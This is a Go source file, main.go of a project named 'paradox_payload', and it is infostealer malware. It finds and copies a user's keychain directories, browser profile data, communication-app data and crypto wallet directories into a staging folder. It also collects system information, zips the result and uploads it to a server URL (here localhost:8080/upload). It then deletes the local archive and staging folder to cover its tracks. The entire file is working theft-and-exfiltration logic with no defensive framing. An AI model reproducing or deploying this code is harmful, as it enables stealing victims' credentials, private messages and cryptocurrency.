package main

import (
	"fmt"
	"os"
	"path/filepath"

	"paradox_payload/discovery"
	"paradox_payload/extraction"
	"paradox_payload/fileops"
)

// BuildID will be set by the linker
var BuildID string

func createOutputDir(path string) error {
	if err := os.MkdirAll(path, 0755); err != nil {
		fmt.Printf("Fatal: Failed to create output directory '%s': %v\n", path, err)
		return err
	}
	return nil
}

func main() {
	// Print the received BuildID (optional, for verification)
	fmt.Printf("Payload running with BuildID: %s\n", BuildID)

	fmt.Println("Starting discovery and collection...")

	baseOutputDir := "out"
	zipFileName := "output.zip"

	outPaths := map[string]string{
		"Base":     baseOutputDir,
		"Browsers": filepath.Join(baseOutputDir, "Browsers"),
		"Keychain": filepath.Join(baseOutputDir, "Keychain"),
		"Comms":    filepath.Join(baseOutputDir, "Communication"),
		"Crypto":   filepath.Join(baseOutputDir, "Crypto"),
		"System":   filepath.Join(baseOutputDir, "System"),
	}

	fmt.Printf("Cleaning up previous '%s' directory and '%s' file...\n", outPaths["Base"], zipFileName)
	if err := os.RemoveAll(outPaths["Base"]); err != nil {
		fmt.Printf("Warning: could not remove previous output directory '%s': %v\n", outPaths["Base"], err)
	}
	if err := os.Remove(zipFileName); err != nil && !os.IsNotExist(err) {
		fmt.Printf("Warning: could not remove previous zip file '%s': %v\n", zipFileName, err)
	}

	defer func() {
		fmt.Printf("Cleaning up temporary directory '%s'...\n", outPaths["Base"])
		if err := os.RemoveAll(outPaths["Base"]); err != nil {
			fmt.Printf("Error cleaning up '%s': %v\n", outPaths["Base"], err)
		}
	}()

	homeDir, err := os.UserHomeDir()
	if err != nil {
		fmt.Printf("Fatal: Failed to get user home directory: %v\n", err)
		return
	}

	fmt.Println("Creating output directories...")
	for category, path := range outPaths {
		if category != "Base" {
			if err := createOutputDir(path); err != nil {
				return
			}
		}
	}

	fmt.Println("Collecting system info...")
	if err := extraction.CollectSystemInfo(BuildID, outPaths["Base"]); err != nil {
		fmt.Printf("Error collecting system info: %v\n", err)
	}

	fmt.Println("Dumping keychain...")
	paths, err := discovery.CheckKeychainDirectories(homeDir)
	if err != nil {
		fmt.Printf("Warning: Error during keychain discovery: %v\n", err)
	}
	fmt.Printf("Found %d potential keychain paths.\n", len(paths))
	for _, dir := range paths {
		dstPath := filepath.Join(outPaths["Keychain"], filepath.Base(dir))
		fmt.Printf("  Copying Crypto '%s' to '%s'...\n", dir, dstPath)
		if err := fileops.CopyDir(dir, dstPath); err != nil {
			fmt.Printf("    Error copying directory '%s': %v\n", dir, err)
		}
	}

	fmt.Println("Discovering browser profiles...")
	browserProfiles, err := discovery.CheckBrowserDirectories(homeDir)
	if err != nil {
		fmt.Printf("Warning: Error during browser discovery: %v\n", err)
	}
	fmt.Printf("Found %d potential browser profiles.\n", len(browserProfiles))

	fmt.Println("Extracting browser data...")
	extractionErrors := 0
	for _, profile := range browserProfiles {
		if err := extraction.ExtractBrowserData(profile, outPaths["Browsers"]); err != nil {
			fmt.Printf("    %v\n", err)
			extractionErrors++
		}
	}
	if extractionErrors > 0 {
		fmt.Printf("Finished browser extraction with %d profile errors.\n", extractionErrors)
	} else if len(browserProfiles) > 0 {
		fmt.Println("Finished browser extraction successfully.")
	}

	fmt.Println("Discovering communication app data...")
	commDirs, err := discovery.CheckCommunicationAppDirectories(homeDir)
	if err != nil {
		fmt.Printf("Warning: Error discovering communication apps: %v\n", err)
	}
	fmt.Printf("Found %d potential comms directories.\n", len(commDirs))
	copyErrors := 0
	for _, dir := range commDirs {
		dstPath := filepath.Join(outPaths["Comms"], filepath.Base(dir))
		fmt.Printf("  Copying Comms '%s' to '%s'...\n", dir, dstPath)
		if err := fileops.CopyDir(dir, dstPath); err != nil {
			fmt.Printf("    Error copying directory '%s': %v\n", dir, err)
			copyErrors++
		}
	}

	fmt.Println("Discovering crypto wallet data...")
	cryptoDirs, err := discovery.CheckCryptoDirectories(homeDir)
	if err != nil {
		fmt.Printf("Warning: Error discovering crypto wallets: %v\n", err)
	}
	fmt.Printf("Found %d potential crypto directories.\n", len(cryptoDirs))
	for _, dir := range cryptoDirs {
		dstPath := filepath.Join(outPaths["Crypto"], filepath.Base(dir))
		fmt.Printf("  Copying Crypto '%s' to '%s'...\n", dir, dstPath)
		if err := fileops.CopyDir(dir, dstPath); err != nil {
			fmt.Printf("    Error copying directory '%s': %v\n", dir, err)
			copyErrors++
		}
	}

	if copyErrors > 0 {
		fmt.Printf("Finished copying directories with %d errors.\n", copyErrors)
	} else {
		fmt.Println("Finished copying directories successfully.")
	}

	fmt.Printf("Zipping output directory '%s' to '%s'...\n", outPaths["Base"], zipFileName)
	if err := fileops.ZipDir(outPaths["Base"], zipFileName); err != nil {
		fmt.Printf("Fatal: Failed to zip directory '%s': %v\n", outPaths["Base"], err)
		return
	}

	fmt.Printf("Successfully created zip file: %s\n", zipFileName)

	serverURL := "http://localhost:8080/upload"

	fmt.Printf("Uploading '%s' to '%s'...\n", zipFileName, serverURL)
	if err := extraction.UploadFile(serverURL, zipFileName); err != nil {
		fmt.Printf("Fatal: Failed to upload zip file: %v\n", err)
		if removeErr := os.Remove(zipFileName); removeErr != nil && !os.IsNotExist(removeErr) {
			fmt.Printf("Warning: Failed to remove local zip file '%s' after upload error: %v\n", zipFileName, removeErr)
		}
		return
	}

	fmt.Printf("Upload successful. Removing local zip file '%s'...\n", zipFileName)
	if err := os.Remove(zipFileName); err != nil && !os.IsNotExist(err) {
		fmt.Printf("Warning: Failed to remove local zip file '%s' after successful upload: %v\n", zipFileName, err)
	}

	fmt.Println("Process completed.")
}
